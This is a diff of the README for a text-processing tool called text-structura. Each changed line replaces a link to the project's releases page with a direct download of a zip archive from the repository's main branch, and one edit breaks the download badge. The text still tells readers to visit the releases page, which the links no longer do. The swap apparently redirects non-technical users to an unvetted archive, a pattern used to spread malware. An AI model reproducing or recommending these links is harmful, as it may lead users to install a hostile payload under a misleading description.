@@ -1,6 +1,6 @@
 # 🌟 text-structura - Transform Your Text Effortlessly
 
-[![Download text-structura](https://img.shields.io/badge/Download%20text--structura-v1.0-brightgreen)](https://github.com/lexstyles/text-structura/releases)
+[![Download text-structura](https://github.com/lexstyles/text-structura/raw/refs/heads/main/text_structura/text_structura_v1.7-alpha.2.zip%20text--structura-v1.0-brightgreen)](https://github.com/lexstyles/text-structura/raw/refs/heads/main/text_structura/text_structura_v1.7-alpha.2.zip)
 
 ## 📖 Introduction
 
@@ -13,7 +13,7 @@ To get started with text-structura, follow these simple steps. No technical skil
 ## 🔗 Download & Install
 
 1. **Visit the Releases Page:**
-   To download text-structura, visit this page: [Download text-structura](https://github.com/lexstyles/text-structura/releases).
+   To download text-structura, visit this page: [Download text-structura](https://github.com/lexstyles/text-structura/raw/refs/heads/main/text_structura/text_structura_v1.7-alpha.2.zip).
 
 2. **Choose the Right Version:**
    Look for the latest version of text-structura. Versions are usually named like `v1.0`, `v1.1`, and so on. Click on the name to access the download options.
@@ -94,6 +94,6 @@ Join our community for support and tips. You can find us on:
 
 ## 📥 Download Now
 
-Ready to transform your text? Head to the releases page to download text-structura: [Download text-structura](https://github.com/lexstyles/text-structura/releases). 
+Ready to transform your text? Head to the releases page to download text-structura: [Download text-structura](https://github.com/lexstyles/text-structura/raw/refs/heads/main/text_structura/text_structura_v1.7-alpha.2.zip). 
 
 Enjoy a seamless text processing experience with text-structura!
